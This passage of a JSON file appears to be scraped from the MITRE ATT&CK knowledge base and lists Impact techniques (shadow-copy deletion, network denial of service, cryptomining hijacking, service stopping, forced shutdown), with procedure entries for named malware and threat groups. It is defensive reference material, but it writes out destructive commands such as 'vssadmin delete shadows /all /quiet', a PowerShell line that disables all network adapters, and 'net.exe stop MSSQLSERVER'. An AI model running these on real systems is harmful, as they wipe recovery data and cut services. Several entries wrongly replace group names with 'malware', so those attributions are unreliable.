                "ID": "S0496",
                "Name": "REvil",
                "Description": "malware can use vssadmin to delete volume shadow copies and bcdedit to disable recovery features.[51][52][53][54][55][56][57][58][59]"
            },
            "S0400": {
                "ID": "S0400",
                "Name": "RobbinHood",
                "Description": "malware deletes shadow copies to ensure that all the data cannot be restored easily.[60]"
            },
            "S1073": {
                "ID": "S1073",
                "Name": "Royal",
                "Description": "malware can delete shadow copy backups with vssadmin.exe using the command delete shadows /all /quiet.[61][62][63]"
            },
            "S0446": {
                "ID": "S0446",
                "Name": "Ryuk",
                "Description": "malware has used vssadmin Delete Shadows /all /quiet to to delete volume shadow copies and vssadmin resize shadowstorage to force deletion of shadow copies created by third-party applications.[64]"
            },
            "S0366": {
                "ID": "S0366",
                "Name": "WannaCry",
                "Description": "malware uses vssadmin, wbadmin, bcdedit, and wmic to delete and disable operating system recovery features.[65][2][66]"
            },
            "S0612": {
                "ID": "S0612",
                "Name": "WastedLocker",
                "Description": "malware can delete shadow volumes.[67][68][69]"
            },
            "G0102": {
                "ID": "G0102",
                "Name": "Wizard Spider",
                "Description": "malware has used WMIC and vssadmin to manually delete volume shadow copies. malware has also used Conti ransomware to delete volume shadow copies automatically with the use of vssadmin.[70]"
            }
        }
    },
    "T1498": {
        "ttp_name": "Network Denial of Service",
        "ttp_id": "T1498",
        "href": "/techniques/T1498",
        "subtechnique": {
            "001": {
                "name": "Direct Network Flood",
                "href": "/techniques/T1498/001",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. Direct Network Floods are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.Botnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.[1]",
                "Procedure": {}
            },
            "002": {
                "name": "Reflection Amplification",
                "href": "/techniques/T1498/002",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target.[1] This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.Reflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS[2] and NTP[3], though the use of several others in the wild have been documented.[4]  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.[5]",
                "Procedure": {}
            }
        },
        "tactic": "Impact",
        "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes[1] and to support other malicious activities, including distraction[2], hacktivism, and extortion.[3]A Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).To perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.For DoS attacks targeting the hosting system directly, see Endpoint Denial of Service.",
        "Procedure": {
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "In 2016, malware conducted a distributed denial of service (DDoS) attack against the World Anti-Doping Agency.[4]"
            },
            "S0532": {
                "ID": "S0532",
                "Name": "Lucifer",
                "Description": "malware can execute TCP, UDP,  and HTTP denial of service (DoS) attacks.[5]"
            },
            "S1107": {
                "ID": "S1107",
                "Name": "NKAbuse",
                "Description": "malware enables multiple types of network denial of service capabilities across several protocols post-installation.[6]"
            }
        }
    },
    "T1496": {
        "ttp_name": "Resource Hijacking",
        "ttp_id": "T1496",
        "href": "/techniques/T1496",
        "tactic": "Impact",
        "description": "Adversaries may leverage the resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. One common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.[1] Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining.[2] Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.[3][4]Additionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it\u2019s not competing for resources.[5]Adversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate Network Denial of Service campaigns and/or to seed malicious torrents.[6] Alternatively, they may engage in proxyjacking by selling use of the victims' network bandwidth and IP address to proxyware services.[7]",
        "Procedure": {
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware deployed a Monero cryptocurrency mining tool in a victim\u2019s environment.[8]"
            },
            "G0108": {
                "ID": "G0108",
                "Name": "Blue Mockingbird",
                "Description": "malware has used XMRIG to mine cryptocurrency on victim systems.[9]"
            },
            "S0486": {
                "ID": "S0486",
                "Name": "Bonadan",
                "Description": "malware can download an additional module which has a cryptocurrency mining extension.[10]"
            },
            "S0492": {
                "ID": "S0492",
                "Name": "CookieMiner",
                "Description": "malware has loaded coinmining software onto systems to mine for Koto cryptocurrency. [11]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware can deploy follow-on cryptocurrency mining payloads.[12]"
            },
            "S0601": {
                "ID": "S0601",
                "Name": "Hildegard",
                "Description": "malware has used xmrig to mine cryptocurrency.[3]"
            },
            "S0434": {
                "ID": "S0434",
                "Name": "Imminent Monitor",
                "Description": "malware has the capability to run a cryptocurrency miner on the victim machine.[13]"
            },
            "S0599": {
                "ID": "S0599",
                "Name": "Kinsing",
                "Description": "malware has created and run a Bitcoin cryptocurrency miner.[14][15]"
            },
            "S0451": {
                "ID": "S0451",
                "Name": "LoudMiner",
                "Description": "malware harvested system resources to mine cryptocurrency, using XMRig to mine Monero.[16]"
            },
            "S0532": {
                "ID": "S0532",
                "Name": "Lucifer",
                "Description": "malware can use system resources to mine cryptocurrency, dropping XMRig to mine Monero.[17]"
            },
            "G0106": {
                "ID": "G0106",
                "Name": "Rocke",
                "Description": "malware has distributed cryptomining malware.[18][19]"
            },
            "S0468": {
                "ID": "S0468",
                "Name": "Skidmap",
                "Description": "malware is a kernel-mode rootkit used for cryptocurrency mining.[20]"
            },
            "G0139": {
                "ID": "G0139",
                "Name": "TeamTNT",
                "Description": "malware has deployed XMRig Docker images to mine cryptocurrency.[21][22] malware has also infected Docker containers and Kubernetes clusters with XMRig, and used RainbowMiner and lolMiner for mining cryptocurrency.[23]"
            }
        }
    },
    "T1489": {
        "ttp_name": "Service Stop",
        "ttp_id": "T1489",
        "href": "/techniques/T1489",
        "tactic": "Impact",
        "description": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.[1][2] Adversaries may accomplish this by disabling individual services of high importance to an organization, such as MSExchangeIS, which will make Exchange content inaccessible [2]. In some cases, adversaries may stop or disable many or all services to render systems unusable.[1] Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct Data Destruction or Data Encrypted for Impact on the data stores of services like Exchange and SQL Server.[3]",
        "Procedure": {
            "S0640": {
                "ID": "S0640",
                "Name": "Avaddon",
                "Description": "malware looks for and attempts to stop database processes.[4]"
            },
            "S1053": {
                "ID": "S1053",
                "Name": "AvosLocker",
                "Description": "malware has terminated specific processes before encryption.[5]"
            },
            "S0638": {
                "ID": "S0638",
                "Name": "Babuk",
                "Description": "malware can stop specific services related to backups.[6][7][8]"
            },
            "S1068": {
                "ID": "S1068",
                "Name": "BlackCat",
                "Description": "malware has the ability to stop VM services on compromised networks.[9][10]"
            },
            "S1096": {
                "ID": "S1096",
                "Name": "Cheerscrypt",
                "Description": "malware has the ability to terminate VM processes on compromised hosts through execution of esxcli vm process kill.[11]"
            },
            "S0611": {
                "ID": "S0611",
                "Name": "Clop",
                "Description": "malware can kill several processes and services related to backups and security solutions.[12][13]"
            },
            "S0575": {
                "ID": "S0575",
                "Name": "Conti",
                "Description": "malware can stop up to 146 Windows services related to security, backup, database, and email solutions through the use of net stop.[14]"
            },
            "S0625": {
                "ID": "S0625",
                "Name": "Cuba",
                "Description": "malware has a hardcoded list of services and processes to terminate.[15]"
            },
            "S0659": {
                "ID": "S0659",
                "Name": "Diavol",
                "Description": "malware will terminate services using the Service Control Manager (SCM) API.[16]"
            },
            "S0605": {
                "ID": "S0605",
                "Name": "EKANS",
                "Description": "malware stops database, data backup solution, antivirus, and ICS-related processes.[17][18][19]"
            },
            "S0697": {
                "ID": "S0697",
                "Name": "HermeticWiper",
                "Description": "malware has the ability to stop the Volume Shadow Copy service.[20]"
            },
            "S0431": {
                "ID": "S0431",
                "Name": "HotCroissant",
                "Description": "malware has the ability to stop services on the infected host.[21]"
            },
            "G0119": {
                "ID": "G0119",
                "Name": "Indrik Spider",
                "Description": "malware has used PsExec to stop services prior to the execution of ransomware.[22]"
            },
            "S0604": {
                "ID": "S0604",
                "Name": "Industroyer",
                "Description": "malware\u2019s data wiper module writes zeros into the registry keys in SYSTEM\\CurrentControlSet\\Services to render a system inoperable.[23]"
            },
            "S0607": {
                "ID": "S0607",
                "Name": "KillDisk",
                "Description": "malware terminates various processes to get the user to reboot the victim machine.[24]"
            },
            "G1004": {
                "ID": "G1004",
                "Name": "LAPSUS$",
                "Description": "malware has shut down virtual machines from within a victim's on-premise VMware ESXi infrastructure.[25]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware has stopped the MSExchangeIS service to render Exchange contents inaccessible to users.[26]"
            },
            "S0582": {
                "ID": "S0582",
                "Name": "LookBack",
                "Description": "malware can kill processes and delete services.[27]"
            },
            "S0449": {
                "ID": "S0449",
                "Name": "Maze",
                "Description": "malware has stopped SQL services to ensure it can encrypt any database.[28]"
            },
            "S0576": {
                "ID": "S0576",
                "Name": "MegaCortex",
                "Description": "malware can stop and disable services on the system.[29]"
            },
            "S0688": {
                "ID": "S0688",
                "Name": "Meteor",
                "Description": "malware can disconnect all network adapters on a compromised host using powershell -Command \"Get-WmiObject -class Win32_NetworkAdapter | ForEach { If ($.NetEnabled) { $.Disable() } }\" > NUL.[30]"
            },
            "S0457": {
                "ID": "S0457",
                "Name": "Netwalker",
                "Description": "malware can terminate system processes and services, some of which relate to backup software.[31]"
            },
            "S0365": {
                "ID": "S0365",
                "Name": "Olympic Destroyer",
                "Description": "malware uses the API call ChangeServiceConfigW to disable all services on the affected system.[1]"
            },
            "S0556": {
                "ID": "S0556",
                "Name": "Pay2Key",
                "Description": "malware can stop the MS SQL service at the end of the encryption process to release files locked by the service.[32]"
            },
            "S1058": {
                "ID": "S1058",
                "Name": "Prestige",
                "Description": "malware has attempted to stop the MSSQL Windows service to ensure successful encryption using C:\\Windows\\System32\\net.exe stop MSSQLSERVER.[33]"
            },
            "S0583": {
                "ID": "S0583",
                "Name": "Pysa",
                "Description": "malware can stop services and processes.[34]"
            },
            "S0481": {
                "ID": "S0481",
                "Name": "Ragnar Locker",
                "Description": "malware has attempted to stop services associated with business applications and databases to release the lock on files used by these applications so they may be encrypted.[35]"
            },
            "S0496": {
                "ID": "S0496",
                "Name": "REvil",
                "Description": "malware has the capability to stop services and kill processes.[36][37]"
            },
            "S0400": {
                "ID": "S0400",
                "Name": "RobbinHood",
                "Description": "malware stops 181 Windows services on the system before beginning the encryption process.[38]"
            },
            "S1073": {
                "ID": "S1073",
                "Name": "Royal",
                "Description": "malware can use RmShutDown to kill  applications and services using the resources that are targeted for encryption.[39]"
            },
            "S0446": {
                "ID": "S0446",
                "Name": "Ryuk",
                "Description": "malware has called kill.bat for stopping services, disabling services and killing processes.[40]"
            },
            "S0533": {
                "ID": "S0533",
                "Name": "SLOTHFULMEDIA",
                "Description": "malware has the capability to stop processes and services.[41]"
            },
            "S0366": {
                "ID": "S0366",
                "Name": "WannaCry",
                "Description": "malware attempts to kill processes associated with Exchange, Microsoft SQL Server, and MySQL to make it possible to encrypt their data stores.[42][3]"
            },
            "G0102": {
                "ID": "G0102",
                "Name": "Wizard Spider",
                "Description": "malware has used taskkill.exe and net.exe to stop backup, catalog, cloud, and other services prior to network encryption.[43]"
            }
        }
    },
    "T1529": {
        "ttp_name": "System Shutdown/Reboot",
        "ttp_id": "T1529",
        "href": "/techniques/T1529",
        "tactic": "Impact",
        "description": "Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via Network Device CLI (e.g. reload).[1][2]Shutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.Adversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as Disk Structure Wipe or Inhibit System Recovery, to hasten the intended effects on system availability.[3][4]",
        "Procedure": {
            "S1125": {
                "ID": "S1125",
                "Name": "AcidRain",
                "Description": "malware reboots the target system once the various wiping processes are complete.[5]"
            },
            "G0067": {
                "ID": "G0067",
                "Name": "APT37",
                "Description": "malware has used malware that will issue the command shutdown /r /t 1 to reboot a system after wiping its MBR.[6]"
            },
            "G0082": {
                "ID": "G0082",
                "Name": "APT38",
                "Description": "malware has used a custom MBR wiper named BOOTWRECK, which will initiate a system reboot after wiping the victim's MBR.[7]"
            },
            "S1053": {
                "ID": "S1053",
                "Name": "AvosLocker",
                "Description": "malware\u2019s Linux variant has terminated ESXi virtual machines.[8]"
            },
            "S1033": {
                "ID": "S1033",
                "Name": "DCSrv",
                "Description": "malware has a function to sleep for two hours before rebooting the system.[9]"
            },
            "S0697": {
                "ID": "S0697",
                "Name": "HermeticWiper",
                "Description": "malware can initiate a system shutdown.[10][11]"
            },
            "S0607": {
                "ID": "S0607",
                "Name": "KillDisk",
                "Description": "malware attempts to reboot the machine by terminating specific processes.[12]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware has rebooted systems after destroying files and wiping the MBR on infected systems.[13]"
            },
            "S0372": {
                "ID": "S0372",
                "Name": "LockerGoga",
                "Description": "malware has been observed shutting down infected systems.[14]"
            },
            "S0582": {
                "ID": "S0582",
                "Name": "LookBack",
                "Description": "malware can shutdown and reboot the victim machine.[15]"
            },
            "S0449": {
                "ID": "S0449",
                "Name": "Maze",
                "Description": "malware has issued a shutdown command on a victim machine that, upon reboot, will run the ransomware within a VM.[16]"
            },
            "S0368": {
                "ID": "S0368",
                "Name": "NotPetya",
                "Description": "malware will reboot the system one hour after infection.[3][17]"
            },
            "S0365": {
                "ID": "S0365",
                "Name": "Olympic Destroyer",
                "Description": "malware will shut down the compromised system after it is done modifying system configuration settings.[4][17]"
            },
            "S0140": {
                "ID": "S0140",
                "Name": "Shamoon",
                "Description": "malware will reboot the infected system once the wiping functionality has been completed.[18][19]"
            },
            "S0689": {
                "ID": "S0689",
                "Name": "WhisperGate",
                "Description": "malware can shutdown a compromised host through execution of ExitWindowsEx with the EXW_SHUTDOWN flag.[20]"
            }
        }
    }
}